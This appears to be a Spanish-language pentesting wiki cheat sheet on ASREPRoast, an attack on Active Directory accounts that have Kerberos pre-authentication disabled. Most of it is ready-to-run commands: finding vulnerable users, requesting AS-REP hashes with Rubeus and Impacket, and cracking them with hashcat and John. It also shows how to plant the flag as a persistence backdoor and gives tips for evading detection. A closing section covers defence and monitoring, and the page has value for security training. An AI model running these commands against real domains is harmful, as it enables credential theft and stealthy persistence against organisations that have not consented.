---
title: "ASREPRoast Cheat Sheet"
category: "AD"
description: "Ataque contra cuentas que tienen desactivada la pre-autenticación Kerberos."
image: "/images/wiki/10.png"
---

# ASREPRoast: Ataque sin Pre-Autenticación Kerberos

**ASREPRoast** es una técnica ofensiva que explota cuentas de Active Directory cuya propiedad `Do not require Kerberos preauthentication` (flag `DONT_REQUIRE_PREAUTH`, bit `0x400000` / decimal `4194304` en `userAccountControl`) está habilitada. Cuando esta flag está activa, **cualquier usuario (incluso sin credenciales de dominio)** puede solicitar un ticket AS-REP al KDC para esa cuenta, y el Controlador de Dominio responderá con un blob cifrado con la clave derivada de la contraseña del usuario. Ese blob puede crackearse offline sin generar un login fallido en el DC.

## Conceptos Previos: Pre-Autenticación Kerberos

### Flujo Normal (Pre-Autenticación Habilitada)

1. El cliente envía un **AS-REQ** al KDC. Incluye un timestamp cifrado con la clave derivada de la contraseña del usuario (campo `PA-ENC-TIMESTAMP`).
2. El KDC descifra el timestamp. Si es válido y reciente, responde con un **AS-REP** que contiene el TGT cifrado con la clave del servicio `krbtgt`.
3. Esto garantiza que quien solicita el ticket **conoce la contraseña** antes de recibir material criptográfico.

### Flujo Vulnerable (Pre-Autenticación Deshabilitada)

1. El cliente envía un **AS-REQ** sin `PA-ENC-TIMESTAMP` (o vacío).
2. El KDC **no valida la identidad** del solicitante y devuelve directamente el AS-REP.
3. El AS-REP contiene una parte cifrada con la clave del usuario (`enc-part`, tipo `EncASRepPart`), derivada de su contraseña.
4. Un atacante captura ese `enc-part` y lo crackea offline con herramientas como hashcat o john.

### Por Qué es Peligroso

| Aspecto | Detalle |
|---------|---------|
| Sin credenciales | El ataque puede lanzarse sin autenticación previa al dominio (solo se necesita conectividad al DC en el puerto 88/TCP) |
| Sin login fallido | No genera eventos de login fallido (4625) como un password spray |
| Offline cracking | El hash se crackea localmente; no hay bloqueo de cuenta |
| Silencioso | Solo genera un evento 4768 (TGT Request), que muchas organizaciones no monitorizan |
| Escalada lateral | Una contraseña recuperada puede dar acceso a múltiples recursos si la cuenta tiene privilegios |

## Identificación de Usuarios Vulnerables

### Con PowerView

```powershell
# Listar todos los usuarios con preauth deshabilitada
Get-DomainUser -PreauthNotRequired -Verbose

# Solo mostrar samaccountname y distinguishedname
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, distinguishedname

# Filtrar también cuentas habilitadas (no desactivadas)
Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol | Where-Object {$_.useraccountcontrol -band 512}
```

### Con AD Module (RSAT)

```powershell
# Consulta directa con el módulo de Active Directory
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

# Con más detalle
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth,MemberOf,LastLogonDate | Select-Object Name,SamAccountName,DoesNotRequirePreAuth,LastLogonDate
```

### Con Consultas LDAP Directas (Windows)

```powershell
# Filtro LDAP para buscar el bit 0x400000 en userAccountControl
# Se usa con dsquery, AdFind o cualquier cliente LDAP
$ldapFilter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"

# Ejemplo con [adsisearcher] (sin dependencias externas)
([adsisearcher]$ldapFilter).FindAll() | ForEach-Object { $_.Properties.samaccountname }
```

### Desde Linux con ldapsearch

```bash
# Con credenciales de dominio (usuario autenticado)
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'Password123' \
  -b "DC=domain,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# Con LDAPS (puerto 636)
ldapsearch -x -H ldaps://DC_IP -D "user@domain.local" -w 'Password123' \
  -b "DC=domain,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

### Con CrackMapExec / NetExec

```bash
# Enumerar usuarios con preauth deshabilitada (requiere credenciales)
crackmapexec ldap DC_IP -u user -p 'Password123' -d domain.local --asreproast output.txt

# Con NetExec (sucesor de CME)
nxc ldap DC_IP -u user -p 'Password123' -d domain.local --asreproast output.txt

# Sin credenciales, con lista de usuarios
nxc ldap DC_IP -u users.txt -p '' -d domain.local --asreproast output.txt
```

### Con Impacket (Enumeración Pura)

```bash
# GetNPUsers.py puede enumerar sin proporcionar hashes si se tiene lista de usuarios
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP
```

## Explotación (Obtener el Hash AS-REP)

### Con ASREPRoast (Módulo PowerShell Original)

```powershell
# Obtener hash de un usuario específico
Get-ASREPHash -UserName TargetUser -Verbose

# Obtener hash de TODOS los usuarios vulnerables del dominio
Invoke-ASREPRoast -Verbose

# Exportar en formato hashcat directamente
Invoke-ASREPRoast | Select-Object -ExpandProperty Hash
```

Repositorio: [https://github.com/HarmJ0y/ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)

### Con Rubeus (Recomendado en Windows)

```powershell
# Solicitar AS-REP de todos los usuarios vulnerables, formato hashcat
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Para un usuario específico
Rubeus.exe asreproast /user:TargetUser /format:hashcat /outfile:hashes.txt

# Con un dominio específico y DC específico
Rubeus.exe asreproast /user:TargetUser /domain:domain.local /dc:dc01.domain.local /format:hashcat

# Usar cifrado RC4 explícitamente (más rápido de crackear)
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /enctype:rc4

# Usar credenciales alternativas
Rubeus.exe asreproast /creduser:domain.local\user /credpassword:Password123 /format:hashcat
```

### Con Impacket GetNPUsers.py (Desde Linux)

```bash
# Con lista de usuarios (sin credenciales de dominio)
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip DC_IP

# Con credenciales válidas (enumera automáticamente los usuarios vulnerables)
impacket-GetNPUsers domain.local/user:Password123 -format hashcat -outputfile hashes.txt -dc-ip DC_IP

# Formato john en lugar de hashcat
impacket-GetNPUsers domain.local/user:Password123 -format john -outputfile hashes.txt -dc-ip DC_IP

# Con hash NTLM en vez de contraseña (pass-the-hash)
impacket-GetNPUsers domain.local/user -hashes :NTLMHASH -format hashcat -outputfile hashes.txt -dc-ip DC_IP

# Solicitar todas las cuentas sin preauth (requiere creds)
impacket-GetNPUsers domain.local/user:Password123 -request -format hashcat -outputfile hashes.txt
```

### Con NetExec / CrackMapExec

```bash
# Obtener hashes AS-REP directamente
nxc ldap DC_IP -u user -p 'Password123' -d domain.local --asreproast hashes.txt

# Sin contraseña, probando usuarios de una lista
nxc ldap DC_IP -u users.txt -p '' -d domain.local --asreproast hashes.txt --kdcHost DC_IP
```

### Con Kerbrute (Enumeración + AS-REP Roast)

```bash
# kerbrute puede identificar usuarios válidos Y obtener hashes AS-REP en un solo paso
./kerbrute userenum --dc DC_IP -d domain.local users.txt

# Los usuarios que devuelven un AS-REP sin preauth se marcan automáticamente
# El hash aparece directamente en la salida
```

## Cracking de Hashes AS-REP

### Formato del Hash

El hash AS-REP tiene el siguiente formato (tipo `$krb5asrep$`):

```
$krb5asrep$23$TargetUser@DOMAIN.LOCAL:random_salt$cifrado_largo_en_hex
```

El `23` indica cifrado RC4-HMAC (etype 23). Si el DC fuerza AES, el hash será etype 17 o 18 (más lento de crackear).

### Con Hashcat

```bash
# Modo 18200 = Kerberos 5 AS-REP etype 23 (RC4)
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt

# Con reglas para ampliar la cobertura
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Si el hash es AES256 (etype 18)
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt

# Si el hash es AES128 (etype 17)
hashcat -m 19800 hashes.txt /usr/share/wordlists/rockyou.txt

# Mostrar contraseñas recuperadas
hashcat -m 18200 hashes.txt --show
```

### Con John the Ripper

```bash
# John detecta automáticamente el formato krb5asrep
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Forzar formato explícito
john hashes.txt --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt

# Mostrar contraseñas crackeadas
john hashes.txt --show
```

### Wordlists Recomendadas

| Wordlist | Ubicación Habitual | Notas |
|----------|--------------------|-------|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | Clásica, 14M de contraseñas |
| SecLists | `/usr/share/seclists/Passwords/` | Colección amplia y categorizada |
| CrackStation | Descarga externa | 1.5B de entradas, muy completa |
| Custom + reglas | Generar con `cewl` o `kwprocessor` | Contraseñas basadas en el contexto del target |

## Targeted AS-REP Roasting (Persistencia / Backdoor)

Si tienes permisos de escritura sobre un objeto de usuario (`WriteProperty` sobre `userAccountControl`, `GenericAll`, `GenericWrite`, o `WriteDACL` para darte el permiso), puedes **activar** la flag `DONT_REQUIRE_PREAUTH` como mecanismo de persistencia. Después, en cualquier momento, puedes solicitar un AS-REP y crackear la contraseña de esa cuenta.

### Con PowerView

```powershell
# Activar "Do not require Kerberos preauthentication" (XOR con 4194304)
Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304} -Verbose

# Verificar que se activó
Get-DomainUser TargetUser -Properties useraccountcontrol

# Ahora obtener el hash
Get-ASREPHash -UserName TargetUser -Verbose

# REVERTIR el cambio después del ataque
Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304} -Verbose
```

### Con AD Module (RSAT)

```powershell
# Activar la flag
Set-ADAccountControl -Identity TargetUser -DoesNotRequirePreAuth $True

# Verificar
Get-ADUser TargetUser -Properties DoesNotRequirePreAuth | Select-Object DoesNotRequirePreAuth

# Revertir
Set-ADAccountControl -Identity TargetUser -DoesNotRequirePreAuth $False
```

### Desde Linux con Impacket

```bash
# Modificar userAccountControl remotamente (requiere permisos adecuados)
# Primero obtener el UAC actual, luego usar bloodyAD o similar

# Con bloodyAD
bloodyAD -d domain.local -u admin -p 'Password123' --host DC_IP set object TargetUser userAccountControl -v 4194304 --append

# Verificar y obtener el hash
impacket-GetNPUsers domain.local/ -usersfile target.txt -format hashcat -dc-ip DC_IP
```

> **Importante:** Revierte siempre el cambio tras obtener el hash. Dejar la flag activa es un indicador de compromiso detectable y debilita la seguridad de la cuenta.

## Consideraciones OPSEC

| Aspecto | Nivel de Ruido | Detalle |
|---------|----------------|---------|
| Solicitar AS-REP | Bajo | Genera un evento **4768** (TGT Request) con tipo de cifrado `0x17` (RC4). Muchos entornos no alertan sobre esto |
| Enumerar con LDAP | Bajo | Consultas LDAP estándar; difícil de distinguir de actividad legítima |
| Modificar `userAccountControl` | **Alto** | Genera evento **4738** (User Account Changed). Cualquier SIEM decente lo detecta |
| Cracking offline | Nulo | Se hace en la máquina del atacante; no genera tráfico ni logs en el dominio |
| Usar RC4 en entorno AES-only | **Medio** | La solicitud de etype 23 en un entorno que normalmente usa AES es anómala y detectable |

### Eventos de Windows Relevantes

| Event ID | Descripción | Relevancia |
|----------|-------------|------------|
| **4768** | A Kerberos authentication ticket (TGT) was requested | El evento principal. Buscar `Ticket Encryption Type: 0x17` y `Pre-Authentication Type: 0` |
| **4738** | A user account was changed | Detecta modificación de `userAccountControl` (targeted AS-REP Roast) |
| **4624** | An account was successfully logged on | Si la contraseña crackeada se usa para loguearse |
| **5136** | A directory service object was modified | Auditoría de cambios en objetos AD (si está habilitada) |

### Recomendaciones para Evadir Detección

- Solicitar AS-REP para **pocos usuarios** a la vez, no barrer todo el dominio.
- Evitar solicitar etype RC4 (`0x17`) si el entorno usa AES por defecto; usar etype 18 (AES256) si es posible (aunque el cracking es más lento).
- Espaciar las solicitudes en el tiempo.
- Si modificas `userAccountControl`, revierte el cambio lo antes posible.

## Defensa y Mitigación

### Medidas Preventivas

1. **Verificar y eliminar la flag:** Auditar periódicamente qué cuentas tienen `DONT_REQUIRE_PREAUTH` y desactivarla salvo necesidad técnica justificada.

```powershell
# Buscar cuentas afectadas
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth | Select-Object Name,SamAccountName

# Desactivar la flag
Set-ADAccountControl -Identity TargetUser -DoesNotRequirePreAuth $False
```

2. **Contraseñas robustas:** Las cuentas que por requisito técnico deben tener preauth deshabilitada necesitan contraseñas de al menos 25+ caracteres generadas aleatoriamente.

3. **Monitorizar Event ID 4768:** Crear alertas en el SIEM para solicitudes TGT con:
   - `Ticket Encryption Type: 0x17` (RC4-HMAC)
   - `Pre-Authentication Type: 0` (sin preauth)

4. **Monitorizar Event ID 4738:** Alertar sobre cambios en `userAccountControl`, especialmente la activación del bit `DONT_REQUIRE_PREAUTH`.

5. **Política de cifrado Kerberos:** Forzar AES (etype 17/18) y deshabilitar RC4 a nivel de GPO. Esto no previene AS-REP Roast pero hace el cracking significativamente más lento.

6. **Managed Service Accounts (gMSA):** Para cuentas de servicio, usar gMSA que rotan contraseñas automáticamente (120 caracteres generados por el DC).

7. **Tiering / privilegios mínimos:** Las cuentas con privilegios elevados (Domain Admins, Enterprise Admins) nunca deben tener preauth deshabilitada.

## AS-REP Roast vs Kerberoasting: Comparativa

| Característica | AS-REP Roast | Kerberoasting |
|---------------|--------------|---------------|
| **Qué se ataca** | Cuentas con preauth deshabilitada (`DONT_REQUIRE_PREAUTH`) | Cuentas con SPN registrado |
| **Requisito de autenticación** | Ninguno (se puede hacer sin creds) | Se necesita al menos un usuario de dominio autenticado |
| **Mensaje Kerberos** | AS-REQ / AS-REP | TGS-REQ / TGS-REP |
| **Hash obtenido** | `$krb5asrep$23$` | `$krb5tgs$23$` |
| **Hashcat mode** | 18200 | 13100 |
| **Event ID principal** | 4768 (TGT Request) | 4769 (TGS Request) |
| **Frecuencia de cuentas vulnerables** | Poco común (requiere config explícita) | Más común (cualquier cuenta con SPN, incluidas service accounts) |
| **Peligro relativo** | Alto (no requiere creds previas) | Alto (más cuentas potencialmente afectadas) |
| **Herramientas principales** | Rubeus, GetNPUsers.py, ASREPRoast.ps1 | Rubeus, GetUserSPNs.py, Invoke-Kerberoast |

## Referencias y Recursos

- [HarmJ0y - Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
- [Impacket - GetNPUsers.py](https://github.com/fortra/impacket)
- [Rubeus - GhostPack](https://github.com/GhostPack/Rubeus)
- [Microsoft - Kerberos Pre-Authentication](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
- [ired.team - AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

## Entradas Relacionadas

- **Kerberoasting** - Ataque contra cuentas con SPN registrado
- **Golden Ticket** - Forjar TGTs con el hash de krbtgt
- **Silver Ticket** - Forjar TGS para servicios específicos
- **Pass the Ticket** - Reutilización de tickets Kerberos robados
- **Unconstrained Delegation** - Delegación sin restricciones y robo de TGTs
